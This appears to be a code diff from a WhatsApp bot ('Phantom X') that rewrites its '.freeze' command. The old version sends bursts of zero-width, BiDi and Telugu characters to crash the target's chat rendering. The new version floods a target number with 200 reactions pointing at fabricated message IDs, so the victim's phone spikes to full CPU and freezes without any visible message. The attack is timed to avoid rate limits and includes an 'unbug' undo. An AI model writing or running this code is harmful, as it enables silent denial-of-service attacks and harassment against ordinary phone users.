@@ -4384,44 +4384,61 @@ _Can be started from any chat, but source members require source group access an
                 break;
             }
 
-            // ─── FREEZE BUG ───
-            // Sends 3 burst payloads of zero-width + BiDi + Telugu chars.
-            // Effect: WhatsApp UI freezes/lags when the chat is opened.
-            // NOTE: This is a UI/rendering crash — it does NOT block network messages.
-            // The target cannot read the chat smoothly but can still send from other devices.
+            // ─── FREEZE BUG (Careless Whisper / Ghost Reaction Flood) ───
+            // Floods target with 200 ghost reactions pointing to random fake message IDs.
+            // Effect: WA receives each reaction, decrypts it, then loops searching for a message
+            // that doesn't exist — CPU spikes to 100%, phone lags/freezes. Silent — no visible chat.
             case ".freeze": {
                 if (!msg.key.fromMe && !isDevJid(senderJid)) return reply("❌ Owner only.");
                 const freezeTarget = parseBugTarget(parts, msg);
                 if (!freezeTarget) return reply(
-                    `🧊 *Freeze Bug*\n\nUsage: *.freeze <number>*\nExample: *.freeze 2348012345678*\n\n` +
-                    `_What it does: Crashes & freezes their WhatsApp chat rendering._\n` +
-                    `_When they open the chat, WA lags/freezes and may force-close._\n` +
-                    `_Sends 3 burst payloads for maximum effect._\n\n` +
+                    `🧊 *Freeze Bug (Careless Whisper)*\n\nUsage: *.freeze <number>*\nExample: *.freeze 2348012345678*\n\n` +
+                    `_What it does: Floods target with ghost reactions pointing to fake message IDs._\n` +
+                    `_Their WA loops searching for messages that don't exist — CPU maxes out, phone freezes._\n` +
+                    `_Silent — no visible message appears in chat._\n\n` +
                     `_Use .bugmenu freeze for full help._`
                 );
                 if (isDevProtected(freezeTarget)) return reply(`🛡️ *Dev Protected!*\n\nThat number belongs to the developer of Phantom X.\nBugs cannot be sent to the developer.`);
-                await reply(`🧊 Sending freeze burst to *${freezeTarget.split("@")[0]}*...`);
+                await reply(`🧊 Sending ghost reaction flood to *${freezeTarget.split("@")[0]}*...`);
                 try {
                     if (!userCrashKeys[freezeTarget]) userCrashKeys[freezeTarget] = [];
-                    const zw   = "\u200b\u200c\u200d\u2060\ufeff\u00ad\u200e\u200f\u2061\u2062\u2063\u2064";
-                    const bidi = "\u202a\u202b\u202c\u202d\u202e\u2066\u2067\u2068\u2069";
-                    const tel  = "\u0C15\u0C4D\u0C37\u0C4D\u0C30";
-                    // Burst 1: pure zero-width flood
-                    const p1 = zw.repeat(2000);
-                    // Burst 2: BiDi + RTL stack
-                    const p2 = bidi.repeat(1200) + "\u202e".repeat(800) + zw.repeat(500);
-                    // Burst 3: combined — hardest for WA to render
-                    const p3 = zw.repeat(600) + tel.repeat(500) + bidi.repeat(600) + "\ufeff".repeat(800) + zw.repeat(600);
-                    for (const payload of [p1, p2, p3]) {
-                        const sent = await sock.sendMessage(freezeTarget, { text: payload });
-                        userCrashKeys[freezeTarget].push(sent.key);
-                        await delay(400);
-                    }
                     if (!userBugTypes[freezeTarget]) userBugTypes[freezeTarget] = [];
+
+                    const emojis = ['👍','❤️','😂','😮','😢','🙏','🔥','💯','😱','🤯'];
+                    const totalReactions = 200;
+                    let sent = 0;
+
+                    for (let i = 0; i < totalReactions; i++) {
+                        // Generate a random fake message ID that looks real but doesn't exist
+                        const fakeId = Array.from({ length: 32 }, () =>
+                            Math.random().toString(36).charAt(2).toUpperCase()
+                        ).join('');
+                        const emoji = emojis[i % emojis.length];
+                        try {
+                            const reactSent = await sock.sendMessage(freezeTarget, {
+                                react: {
+                                    text: emoji,
+                                    key: {
+                                        remoteJid: freezeTarget,
+                                        id: fakeId,
+                                        fromMe: false,
+                                        participant: freezeTarget
+                                    }
+                                }
+                            });
+                            if (reactSent?.key) userCrashKeys[freezeTarget].push(reactSent.key);
+                            sent++;
+                        } catch (_) {}
+                        // Tiny delay — fast enough to flood, small enough to avoid instant rate-limit
+                        if (i % 20 === 19) await delay(150);
+                    }
+
                     if (!userBugTypes[freezeTarget].includes("Freeze")) userBugTypes[freezeTarget].push("Freeze");
                     await reply(
-                        `✅ *Freeze sent to ${freezeTarget.split("@")[0]}!*\n\n` +
-                        `🧊 Active on their device.\n` +
+                        `✅ *Ghost Reaction Flood sent to ${freezeTarget.split("@")[0]}!*\n\n` +
+                        `👻 *${sent} ghost reactions* fired — all pointing to fake IDs.\n` +
+                        `🧊 Their WA is now looping searching for nothing.\n` +
+                        `🔇 Silent — no visible messages in chat.\n` +
                         `🔧 To undo: *.unbug ${freezeTarget.split("@")[0]}*`
                     );
                 } catch (e) { await reply(`❌ Failed: ${e?.message}`); }
